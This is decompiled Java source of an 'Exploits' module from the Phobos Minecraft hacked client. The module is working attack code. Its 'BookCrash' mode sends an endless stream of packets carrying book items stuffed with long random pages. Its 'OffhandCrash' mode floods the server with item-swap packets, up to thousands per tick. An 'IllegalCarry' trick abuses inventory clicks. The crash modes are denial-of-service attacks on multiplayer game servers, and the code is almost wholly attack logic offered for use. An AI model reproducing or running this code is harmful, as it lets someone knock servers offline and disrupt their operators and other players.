/*     */ package me.earth.phobos.features.modules.misc;
/*     */ 
/*     */ import java.util.Random;
/*     */ import me.earth.phobos.event.events.PacketEvent;
/*     */ import me.earth.phobos.features.modules.Module;
/*     */ import me.earth.phobos.features.setting.Bind;
/*     */ import me.earth.phobos.features.setting.Setting;
/*     */ import net.minecraft.client.gui.inventory.GuiContainer;
/*     */ import net.minecraft.entity.player.EntityPlayer;
/*     */ import net.minecraft.init.Items;
/*     */ import net.minecraft.init.SoundEvents;
/*     */ import net.minecraft.inventory.ClickType;
/*     */ import net.minecraft.inventory.Slot;
/*     */ import net.minecraft.item.ItemStack;
/*     */ import net.minecraft.nbt.NBTBase;
/*     */ import net.minecraft.nbt.NBTTagCompound;
/*     */ import net.minecraft.nbt.NBTTagList;
/*     */ import net.minecraft.nbt.NBTTagString;
/*     */ import net.minecraft.network.Packet;
/*     */ import net.minecraft.network.play.client.CPacketClickWindow;
/*     */ import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
/*     */ import net.minecraft.network.play.client.CPacketPlayerDigging;
/*     */ import net.minecraft.network.play.server.SPacketSoundEffect;
/*     */ import net.minecraft.util.EnumFacing;
/*     */ import net.minecraft.util.math.BlockPos;
/*     */ import net.minecraftforge.fml.common.eventhandler.EventPriority;
/*     */ import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
/*     */ import net.minecraftforge.fml.common.gameevent.InputEvent;
/*     */ import org.lwjgl.input.Keyboard;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ public class Exploits
/*     */   extends Module
/*     */ {
/*  37 */   public Setting<Boolean> illegalCarry = register(new Setting("IllegalCarry", Boolean.valueOf(false)));
/*  38 */   public Setting<Bind> toXCarry = register(new Setting("ToXCarry", new Bind(-1), v -> ((Boolean)this.illegalCarry.getValue()).booleanValue()));
/*  39 */   public Setting<Bind> fromXCarry = register(new Setting("FromXCarry", new Bind(-1), v -> ((Boolean)this.illegalCarry.getValue()).booleanValue()));
/*     */   
/*  41 */   public Setting<Boolean> bookCrash = register(new Setting("BookCrash", Boolean.valueOf(false)));
/*  42 */   public Setting<Mode> mode = register(new Setting("Mode", Mode.WindowClick, v -> ((Boolean)this.bookCrash.getValue()).booleanValue()));
/*  43 */   public Setting<Integer> delay = register(new Setting("Delay", Integer.valueOf(5), Integer.valueOf(1), Integer.valueOf(500), v -> ((Boolean)this.bookCrash.getValue()).booleanValue()));
/*  44 */   public Setting<Integer> strLength = register(new Setting("Length", Integer.valueOf(600), Integer.valueOf(100), Integer.valueOf(655), v -> ((Boolean)this.bookCrash.getValue()).booleanValue()));
/*     */   
/*  46 */   public Setting<Boolean> offhandCrash = register(new Setting("OffhandCrash", Boolean.valueOf(false)));
/*  47 */   private final Setting<Boolean> antilag = register(new Setting("AntiOffhandCrash", Boolean.valueOf(true), v -> ((Boolean)this.offhandCrash.getValue()).booleanValue()));
/*  48 */   private final Setting<Boolean> docrash = register(new Setting("Use Offhand Crash", Boolean.valueOf(true), v -> ((Boolean)this.offhandCrash.getValue()).booleanValue()));
/*  49 */   private final Setting<Integer> loopzz = register(new Setting("Times to loop", Integer.valueOf(500), Integer.valueOf(100), Integer.valueOf(5000), v -> ((Boolean)this.offhandCrash.getValue()).booleanValue()));
/*     */   
/*     */   private Packet packet;
/*  52 */   private String pages = "";
/*     */   private boolean flag = true;
/*     */   
/*     */   public Exploits() {
/*  56 */     super("Exploits", "Some expploits", Module.Category.MISC, true, false, false);
/*     */   }
/*     */ 
/*     */   
/*     */   public void onEnable() {
/*  61 */     if (((Boolean)this.bookCrash.getValue()).booleanValue()) {
/*  62 */       this.pages = genRandomString((Integer)this.strLength.getValue());
/*  63 */       runThread();
/*  64 */       this.flag = true;
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public void onDisable() {
/*  70 */     if (((Boolean)this.bookCrash.getValue()).booleanValue()) {
/*  71 */       this.pages = "";
/*  72 */       this.flag = false;
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public void onUpdate() {
/*  78 */     if (((Boolean)this.offhandCrash.getValue()).booleanValue()) {
/*  79 */       if (((Boolean)this.docrash.getValue()).booleanValue()) {
/*  80 */         for (int i = 0; i < ((Integer)this.loopzz.getValue()).intValue(); i++) {
/*  81 */           BlockPos playerBlock = new BlockPos(mc.field_71439_g.field_70165_t, mc.field_71439_g.field_70163_u - 1.0D, mc.field_71439_g.field_70161_v);
/*  82 */           mc.field_71439_g.field_71174_a.func_147297_a((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, playerBlock, EnumFacing.UP));
/*     */         } 
/*     */       }
/*  85 */       if (mc.field_71462_r instanceof net.minecraft.client.gui.GuiMainMenu || mc.field_71462_r instanceof net.minecraft.client.gui.GuiDisconnected || mc.field_71462_r instanceof net.minecraft.client.gui.GuiDownloadTerrain || mc.field_71462_r instanceof net.minecraft.client.multiplayer.GuiConnecting || mc.field_71462_r instanceof net.minecraft.client.gui.GuiMultiplayer)
/*     */       {
/*     */ 
/*     */ 
/*     */ 
/*     */         
/*  91 */         if (isEnabled()) {
/*  92 */           toggle();
/*     */         }
/*     */       }
/*     */     } 
/*     */   }
/*     */   
/*     */   @SubscribeEvent
/*     */   public void onPacketSend(PacketEvent.Send event) {
/* 100 */     if (((Boolean)this.offhandCrash.getValue()).booleanValue() && ((Boolean)this.antilag.getValue()).booleanValue())
/*     */     {
/* 102 */       if (event.getPacket() instanceof SPacketSoundEffect) {
/* 103 */         SPacketSoundEffect packet = (SPacketSoundEffect)event.getPacket();
/* 104 */         if (packet.func_186978_a() == SoundEvents.field_187719_p) {
/* 105 */           event.setCanceled(true);
/*     */         }
/*     */       } 
/*     */     }
/*     */   }
/*     */ 
/*     */   
/*     */   public void onLogout() {
/* 113 */     disable();
/*     */   }
/*     */ 
/*     */   
/*     */   public void onUnload() {
/* 118 */     disable();
/*     */   }
/*     */   
/*     */   private void runThread() {
/* 122 */     (new Thread(() -> {
/*     */           try {
/*     */             ItemStack bookObj = new ItemStack(Items.field_151099_bA);
/*     */             NBTTagList list = new NBTTagList();
/*     */             NBTTagCompound tag = new NBTTagCompound();
/*     */             String author = mc.func_110432_I().func_111285_a();
/*     */             for (int i = 0; i < 50; i++) {
/*     */               NBTTagString tString = new NBTTagString(this.pages);
/*     */               list.func_74742_a((NBTBase)tString);
/*     */             } 
/*     */             tag.func_74778_a("author", author);
/*     */             tag.func_74778_a("title", "\n ZimCRASH \n");
/*     */             tag.func_74782_a("pages", (NBTBase)list);
/*     */             bookObj.func_77983_a("pages", (NBTBase)list);
/*     */             bookObj.func_77982_d(tag);
/*     */             if (this.mode.getValue() == Mode.ConsoleSpammer) {
/*     */               this.pages = genRandomString(Integer.valueOf(8192));
/*     */               this.strLength.setValue(Integer.valueOf(8192));
/*     */               this.delay.setValue(Integer.valueOf(225));
/*     */             } 
/*     */             while (this.flag) {
/*     */               switch ((Mode)this.mode.getValue()) {
/*     */                 case CreativeInventory:
/*     */                   this.packet = (Packet)new CPacketCreativeInventoryAction(0, bookObj);
/*     */                 case WindowClick:
/*     */                   this.packet = (Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0);
/*     */                 case ConsoleSpammer:
/*     */                   this.packet = (Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0);
/*     */                   break;
/*     */               } 
/*     */               mc.field_71439_g.field_71174_a.func_147297_a(this.packet);
/*     */               try {
/*     */                 Thread.sleep(((Integer)this.delay.getValue()).intValue());
/* 155 */               } catch (Exception e) {
/*     */                 Thread.interrupted();
/*     */               } 
/*     */             } 
/* 159 */           } catch (Exception e) {
/*     */             e.printStackTrace();
/*     */           } 
/* 162 */         })).start();
/*     */   }
/*     */   
/*     */   private String genRandomString(Integer Length) {
/* 166 */     String SALTCHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
/* 167 */     StringBuilder salt = new StringBuilder();
/* 168 */     Random rnd = new Random();
/* 169 */     while (salt.length() < Length.intValue()) {
/* 170 */       int index = (int)(rnd.nextFloat() * SALTCHARS.length());
/* 171 */       salt.append(SALTCHARS.charAt(index));
/*     */     } 
/* 173 */     String saltStr = salt.toString();
/* 174 */     return saltStr;
/*     */   }
/*     */   
/*     */   @SubscribeEvent(priority = EventPriority.NORMAL, receiveCanceled = true)
/*     */   public void onKeyInput(InputEvent.KeyInputEvent event) {
/* 179 */     if (((Boolean)this.illegalCarry.getValue()).booleanValue() && Keyboard.getEventKeyState() && mc.field_71462_r instanceof GuiContainer)
/* 180 */       if (((Bind)this.toXCarry.getValue()).getKey() == Keyboard.getEventKey()) {
/* 181 */         GuiContainer container = (GuiContainer)mc.field_71462_r;
/* 182 */         Slot slot = container.getSlotUnderMouse();
/* 183 */         if (slot != null) {
/* 184 */           mc.field_71442_b.func_187098_a(container.field_147002_h.field_75152_c, slot.getSlotIndex(), 0, ClickType.PICKUP, (EntityPlayer)mc.field_71439_g);
/* 185 */           mc.field_71442_b.func_187098_a(container.field_147002_h.field_75152_c, -999, 0, ClickType.QUICK_CRAFT, (EntityPlayer)mc.field_71439_g);
/* 186 */           mc.field_71442_b.func_187098_a(0, 1, 1, ClickType.QUICK_CRAFT, (EntityPlayer)mc.field_71439_g);
/* 187 */           mc.field_71442_b.func_187098_a(container.field_147002_h.field_75152_c, -999, 2, ClickType.QUICK_CRAFT, (EntityPlayer)mc.field_71439_g);
/*     */         } 
/* 189 */       } else if (((Bind)this.fromXCarry.getValue()).getKey() == Keyboard.getEventKey()) {
/* 190 */         GuiContainer container = (GuiContainer)mc.field_71462_r;
/* 191 */         Slot slot = container.getSlotUnderMouse();
/* 192 */         if (slot != null) {
/* 193 */           mc.field_71442_b.func_187098_a(0, 1, 0, ClickType.PICKUP, (EntityPlayer)mc.field_71439_g);
/* 194 */           mc.field_71442_b.func_187098_a(0, -999, 0, ClickType.QUICK_CRAFT, (EntityPlayer)mc.field_71439_g);
/* 195 */           mc.field_71442_b.func_187098_a(container.field_147002_h.field_75152_c, slot.getSlotIndex(), 1, ClickType.QUICK_CRAFT, (EntityPlayer)mc.field_71439_g);
/* 196 */           mc.field_71442_b.func_187098_a(0, -999, 2, ClickType.QUICK_CRAFT, (EntityPlayer)mc.field_71439_g);
/*     */         } 
/*     */       }  
/*     */   }
/*     */   
/*     */   private enum Mode
/*     */   {
/* 203 */     CreativeInventory, WindowClick, ConsoleSpammer;
/*     */   }
/*     */ }


/* Location:              C:\Users\miss_\Desktop\Phobos-1.3.3-release.jar!\me\earth\phobos\features\modules\misc\Exploits.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */